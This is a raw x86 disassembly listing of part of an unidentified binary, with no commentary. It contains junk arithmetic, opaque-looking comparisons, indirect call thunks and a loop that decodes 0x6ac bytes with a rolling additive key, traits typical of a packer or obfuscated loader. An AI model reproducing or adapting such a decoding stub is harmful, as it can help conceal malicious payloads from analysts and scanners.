  4d10c5:	call   0x4d0b7c
  4d10ca:	add    esp,0x4
  4d10cd:	pop    edx
  4d10ce:	push   edx
  4d10cf:	push   DWORD PTR [edx+0x1d8]
  4d10d5:	push   eax
  4d10d6:	call   0x4d0998
  4d10db:	add    esp,0x8
  4d10de:	pop    edx
  4d10df:	push   edx
  4d10e0:	push   0xfffffff4
  4d10e2:	call   0x4d06ec
  4d10e7:	add    esp,0x4
  4d10ea:	pop    edx
  4d10eb:	add    esp,0x4c
  4d10ee:	pop    ebp
  4d10ef:	ret    
  4d10f0:	mov    edi,edi
  4d10f2:	push   ebp
  4d10f3:	mov    ebp,esp
  4d10f5:	sub    esp,0x28
  4d10f8:	lea    eax,ds:0x4d30d0
  4d10fe:	mov    esi,DWORD PTR [eax-0x18]
  4d1101:	push   eax
  4d1102:	push   0x0
  4d1104:	call   0x4d0d28
  4d1109:	add    esp,0x4
  4d110c:	pop    eax
  4d110d:	push   eax
  4d110e:	push   edx
  4d110f:	push   ecx
  4d1110:	push   ebx
  4d1111:	push   DWORD PTR [eax+0x9c]
  4d1117:	call   0x4d1064
  4d111c:	add    esp,0x10
  4d111f:	pop    eax
  4d1120:	push   eax
  4d1121:	mov    edi,0xfffffff4
  4d1126:	push   edi
  4d1127:	call   0x4d06ec
  4d112c:	add    esp,0x4
  4d112f:	pop    eax
  4d1130:	add    esp,0x28
  4d1133:	pop    ebp
  4d1134:	ret    
  4d1135:	add    BYTE PTR [eax],al
  4d1137:	add    BYTE PTR [edi-0x1],bl
  4d113a:	adc    eax,0x4d201c
  4d113f:	call   edi
  4d1141:	add    BYTE PTR [eax],al
  4d1143:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1149:	sub    esp,0x28
  4d114c:	lea    ebx,ds:0x4d3178
  4d1152:	add    eax,0x2340
  4d1157:	push   ebx
  4d1158:	push   edi
  4d1159:	push   DWORD PTR [ebx+0xec]
  4d115f:	push   DWORD PTR [ebx+0x14]
  4d1162:	push   edi
  4d1163:	call   0x4d1454
  4d1168:	add    esp,0x10
  4d116b:	pop    ebx
  4d116c:	push   0x0
  4d116e:	call   0x4d0cc4
  4d1173:	add    esp,0x4
  4d1176:	push   0x0
  4d1178:	call   0x4d10a0
  4d117d:	add    esp,0x4
  4d1180:	add    esp,0x28
  4d1183:	pop    ebp
  4d1184:	ret    
  4d1185:	add    BYTE PTR [eax],al
  4d1187:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d118d:	sub    esp,0x20
  4d1190:	mov    ebx,0x4d312c
  4d1195:	mov    edx,0x497e
  4d119a:	push   ebx
  4d119b:	push   ecx
  4d119c:	push   DWORD PTR [ebx+0x1c4]
  4d11a2:	push   DWORD PTR [ebx+0x104]
  4d11a8:	call   0x4d09dc
  4d11ad:	add    esp,0xc
  4d11b0:	pop    ebx
  4d11b1:	mov    edx,0x0
  4d11b6:	push   edx
  4d11b7:	call   0x4d1594
  4d11bc:	add    esp,0x4
  4d11bf:	call   0x4d0dd4
  4d11c4:	add    esp,0x4
  4d11c7:	add    esp,0x20
  4d11ca:	pop    ebp
  4d11cb:	ret    
  4d11cc:	pop    edi
  4d11cd:	call   DWORD PTR ds:0x4d2074
  4d11d3:	call   edi
  4d11d5:	add    BYTE PTR [eax],al
  4d11d7:	add    BYTE PTR [edi-0x1],bl
  4d11da:	adc    eax,0x4d2088
  4d11df:	call   edi
  4d11e1:	add    BYTE PTR [eax],al
  4d11e3:	add    BYTE PTR [edi-0x1],bl
  4d11e6:	adc    eax,0x4d200c
  4d11eb:	call   edi
  4d11ed:	add    BYTE PTR [eax],al
  4d11ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11f5:	sub    esp,0x2c
  4d11f8:	xor    DWORD PTR [ecx-0x5c],ecx
  4d11fb:	lea    edx,[ecx+0xe4]
  4d1201:	push   edx
  4d1202:	mov    edi,0x6ac
  4d1207:	push   edi
  4d1208:	push   0x6ac
  4d120d:	push   0x40001
  4d1212:	mov    edx,0x86298596
  4d1217:	push   DWORD PTR [edx+0x7a239a86]
  4d121d:	sub    DWORD PTR [esp],0x2
  4d1221:	mov    edx,0x4d204c
  4d1226:	pop    DWORD PTR [edx]
  4d1228:	call   0x4d0900
  4d122d:	add    esp,0x4
  4d1230:	xchg   DWORD PTR [esp],eax
  4d1233:	mov    edx,eax
  4d1235:	pop    DWORD PTR [edx-0x1b4]
  4d123b:	mov    esi,DWORD PTR [edx-0x1b4]
  4d1241:	mov    eax,esi
  4d1243:	sub    ecx,ecx
  4d1245:	dec    ecx
  4d1246:	and    ecx,0x4d0014
  4d124c:	mov    ebx,0x7ec7f445
  4d1251:	xor    esi,esi
  4d1253:	cmp    esi,0x6ac
  4d1259:	je     0x4d1277
  4d125b:	sub    esi,0xfffffffc
  4d125e:	xor    edi,edi
  4d1260:	push   DWORD PTR [ecx+edi*1]
  4d1263:	add    DWORD PTR [esp],ebx
  4d1266:	pop    DWORD PTR [eax+edi*2]
  4d1269:	dec    DWORD PTR [eax]
  4d126b:	xor    ebx,ebx
  4d126d:	add    ebx,DWORD PTR [ecx]
  4d126f:	add    ecx,0x4
  4d1272:	add    eax,0x4
  4d1275:	jmp    0x4d1253
  4d1277:	push   edx
  4d1278:	mov    eax,0x0
  4d127d:	push   eax
  4d127e:	call   0x4d0edc
  4d1283:	add    esp,0x4
  4d1286:	pop    edx
  4d1287:	add    esp,0x2c
  4d128a:	pop    ebp
  4d128b:	ret    
  4d128c:	mov    edi,edi
  4d128e:	push   ebp
  4d128f:	mov    ebp,esp
  4d1291:	sub    esp,0x34
  4d1294:	lea    edi,ds:0x4d313c
  4d129a:	cmp    edi,0x359a
  4d12a0:	je     0x4d128f
  4d12a2:	push   edi
  4d12a3:	push   DWORD PTR [edi+0x164]
  4d12a9:	push   DWORD PTR [edi+0x4]
  4d12ac:	call   0x4d0e54
  4d12b1:	add    esp,0x8
  4d12b4:	pop    edi
  4d12b5:	push   edi
  4d12b6:	call   0x4d0dc8
  4d12bb:	add    esp,0x4
  4d12be:	pop    edi
  4d12bf:	push   edi
  4d12c0:	mov    edi,0x0
  4d12c5:	push   edi
  4d12c6:	call   0x4d15a0
  4d12cb:	add    esp,0x4
  4d12ce:	pop    edi
  4d12cf:	add    esp,0x34
  4d12d2:	pop    ebp
  4d12d3:	ret    
  4d12d4:	pop    edi
  4d12d5:	call   DWORD PTR ds:0x4d2008
  4d12db:	call   edi
  4d12dd:	add    BYTE PTR [eax],al
  4d12df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12e5:	sub    esp,0x5c
  4d12e8:	mov    esi,0x4d3134
  4d12ed:	add    DWORD PTR [ebp-0xc],0x77
  4d12f1:	push   esi
  4d12f2:	push   edi
  4d12f3:	push   DWORD PTR [esi+0xd0]
  4d12f9:	push   DWORD PTR [esi+0x3c]
  4d12fc:	call   0x4d1500
  4d1301:	add    esp,0xc
  4d1304:	pop    esi
  4d1305:	call   0x4d0dc8
  4d130a:	add    esp,0x4
  4d130d:	call   0x4d11e4
  4d1312:	add    esp,0x4
  4d1315:	add    esp,0x5c
  4d1318:	pop    ebp
  4d1319:	ret    
  4d131a:	add    BYTE PTR [eax],al
  4d131c:	mov    edi,edi
  4d131e:	push   ebp
  4d131f:	mov    ebp,esp
  4d1321:	sub    esp,0x3c
  4d1324:	mov    eax,0x4d3110
  4d1329:	xor    DWORD PTR [eax+0xe0],0xffff9a27
  4d1333:	push   eax
  4d1334:	push   DWORD PTR [eax+0x118]
  4d133a:	push   ebx
  4d133b:	call   0x4d1404
  4d1340:	add    esp,0x8
  4d1343:	pop    eax
  4d1344:	push   eax
  4d1345:	mov    esi,0x0
  4d134a:	push   esi
  4d134b:	call   0x4d0cc4
  4d1350:	add    esp,0x4
  4d1353:	pop    eax
  4d1354:	push   eax
  4d1355:	call   0x4d0dd4
  4d135a:	add    esp,0x4
  4d135d:	pop    eax
  4d135e:	add    esp,0x3c
  4d1361:	pop    ebp
  4d1362:	ret    
  4d1363:	add    BYTE PTR [edi-0x1],bl
  4d1366:	adc    eax,0x4d2040
  4d136b:	call   edi
  4d136d:	add    BYTE PTR [eax],al
  4d136f:	add    BYTE PTR [edi-0x1],bl
  4d1372:	adc    eax,0x4d2038
  4d1377:	call   edi
  4d1379:	add    BYTE PTR [eax],al
  4d137b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1381:	sub    esp,0x4c
  4d1384:	lea    ecx,[edi-0x1e4]
  4d138a:	adc    DWORD PTR [ebp-0x38],0x54
  4d138e:	push   ecx
  4d138f:	push   edi
  4d1390:	push   DWORD PTR [ecx+0x1c8]
  4d1396:	push   DWORD PTR [ecx+0x14c]
  4d139c:	push   edi
  4d139d:	call   0x4d0cd0
  4d13a2:	add    esp,0x10
  4d13a5:	pop    ecx
  4d13a6:	push   ecx
  4d13a7:	mov    ebx,0x0
  4d13ac:	push   ebx
  4d13ad:	call   0x4d15a0
  4d13b2:	add    esp,0x4
  4d13b5:	pop    ecx
  4d13b6:	push   ecx
  4d13b7:	push   0x0
  4d13b9:	call   0x4d0ee8
  4d13be:	add    esp,0x4
  4d13c1:	pop    ecx
  4d13c2:	add    esp,0x4c
  4d13c5:	pop    ebp
  4d13c6:	ret    
  4d13c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13cd:	sub    esp,0x48
  4d13d0:	mov    esi,0x4d31f4
  4d13d5:	cmp    esi,0x337e
  4d13db:	je     0x4d13cb
  4d13dd:	push   esi
  4d13de:	push   DWORD PTR [esi+0x74]
  4d13e1:	push   edx
  4d13e2:	push   edi
  4d13e3:	call   0x4d0ba0
  4d13e8:	add    esp,0xc
  4d13eb:	pop    esi
  4d13ec:	call   0x4d11e4
  4d13f1:	add    esp,0x4
  4d13f4:	push   0x0
  4d13f6:	call   0x4d15a0
  4d13fb:	add    esp,0x4
  4d13fe:	add    esp,0x48
  4d1401:	pop    ebp
  4d1402:	ret    
  4d1403:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1409:	sub    esp,0x48
  4d140c:	mov    esi,0x4d30f8
  4d1411:	xor    ecx,eax
  4d1413:	push   0x0
  4d1415:	call   0x4d0d34
  4d141a:	add    esp,0x4
  4d141d:	push   esi
  4d141e:	push   DWORD PTR [esi+0x84]
  4d1424:	push   eax
  4d1425:	push   edi
  4d1426:	push   DWORD PTR [esi+0x48]
  4d1429:	call   0x4d0f9c
  4d142e:	add    esp,0x10
  4d1431:	pop    esi
  4d1432:	mov    ebx,0xfffffff4
  4d1437:	push   ebx
  4d1438:	call   0x4d06ec
  4d143d:	add    esp,0x4
  4d1440:	add    esp,0x48
  4d1443:	pop    ebp
  4d1444:	ret    
  4d1445:	add    BYTE PTR [eax],al
  4d1447:	add    BYTE PTR [edi-0x1],bl
  4d144a:	adc    eax,0x4d205c
  4d144f:	call   edi
  4d1451:	add    BYTE PTR [eax],al
  4d1453:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1459:	sub    esp,0x58
  4d145c:	mov    eax,0x4d3118
  4d1461:	cmp    eax,0x4747
  4d1466:	jb     0x4d1457
  4d1468:	push   eax
  4d1469:	push   0x0
  4d146b:	call   0x4d0d34
  4d1470:	add    esp,0x4
  4d1473:	pop    eax
  4d1474:	push   eax
  4d1475:	push   DWORD PTR [eax+0xb8]
  4d147b:	push   DWORD PTR [eax+0x11c]
  4d1481:	push   DWORD PTR [eax+0x118]
  4d1487:	call   0x4d07dc
  4d148c:	add    esp,0xc
  4d148f:	pop    eax
  4d1490:	push   eax
  4d1491:	mov    edx,0x0
  4d1496:	push   edx
  4d1497:	call   0x4d0ee8
  4d149c:	add    esp,0x4
  4d149f:	pop    eax
  4d14a0:	add    esp,0x58
  4d14a3:	pop    ebp
  4d14a4:	ret    
  4d14a5:	add    BYTE PTR [eax],al
  4d14a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14ad:	sub    esp,0x60
  4d14b0:	mov    ebx,0x4d303c
  4d14b5:	sub    esi,0x8d9
  4d14bb:	push   ebx
  4d14bc:	push   DWORD PTR [ebx+0x24]
  4d14bf:	push   DWORD PTR [ebx+0x10c]
  4d14c5:	push   DWORD PTR [ebx+0xac]
  4d14cb:	call   0x4d0e94
  4d14d0:	add    esp,0xc
  4d14d3:	pop    ebx
  4d14d4:	push   0x0
  4d14d6:	call   0x4d15a0
  4d14db:	add    esp,0x4
  4d14de:	mov    eax,0xfffffff4
  4d14e3:	push   eax
  4d14e4:	call   0x4d06ec
  4d14e9:	add    esp,0x4
  4d14ec:	add    esp,0x60
  4d14ef:	pop    ebp
  4d14f0:	ret    
  4d14f1:	add    BYTE PTR [eax],al
  4d14f3:	add    BYTE PTR [edi-0x1],bl
  4d14f6:	adc    eax,0x4d207c
  4d14fb:	call   edi
  4d14fd:	add    BYTE PTR [eax],al
  4d14ff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1505:	sub    esp,0x3c
  4d1508:	lea    ecx,[esi+0x74]
  4d150b:	sub    DWORD PTR [ecx-0xe0],esi
  4d1511:	push   ecx
  4d1512:	push   eax
  4d1513:	push   DWORD PTR [ecx+0x20]
  4d1516:	push   edx
  4d1517:	call   0x4d0ef4
  4d151c:	add    esp,0xc
  4d151f:	pop    ecx
  4d1520:	push   ecx
  4d1521:	call   0x4d11e4
  4d1526:	add    esp,0x4
  4d1529:	pop    ecx
  4d152a:	push   ecx
  4d152b:	push   0x0
  4d152d:	call   0x4d0d34
  4d1532:	add    esp,0x4
  4d1535:	pop    ecx
  4d1536:	add    esp,0x3c
  4d1539:	pop    ebp
  4d153a:	ret    
  4d153b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1541:	sub    esp,0x4c
  4d1544:	lea    eax,[ebx+0xa4]
  4d154a:	xor    edx,0x6d72
  4d1550:	push   eax
  4d1551:	push   0x0
  4d1553:	call   0x4d0d28
  4d1558:	add    esp,0x4
  4d155b:	pop    eax
  4d155c:	push   eax
  4d155d:	push   DWORD PTR [eax+0xe0]
  4d1563:	push   edx
  4d1564:	push   DWORD PTR [eax+0x118]
  4d156a:	call   0x4d0b30
  4d156f:	add    esp,0xc
  4d1572:	pop    eax
  4d1573:	push   eax
  4d1574:	mov    eax,0x0
  4d1579:	push   eax
  4d157a:	call   0x4d10a0
  4d157f:	add    esp,0x4
  4d1582:	pop    eax
  4d1583:	add    esp,0x4c
  4d1586:	pop    ebp
  4d1587:	ret    
  4d1588:	pop    edi
  4d1589:	call   DWORD PTR ds:0x4d2058
  4d158f:	call   edi
  4d1591:	add    BYTE PTR [eax],al
  4d1593:	add    BYTE PTR [edi-0x1],bl
  4d1596:	adc    eax,0x4d2084
  4d159b:	call   edi
  4d159d:	add    BYTE PTR [eax],al
  4d159f:	add    BYTE PTR [edi-0x1],bl
  4d15a2:	adc    eax,0x4d2030
  4d15a7:	call   edi
  4d15a9:	add    BYTE PTR [eax],al
	...
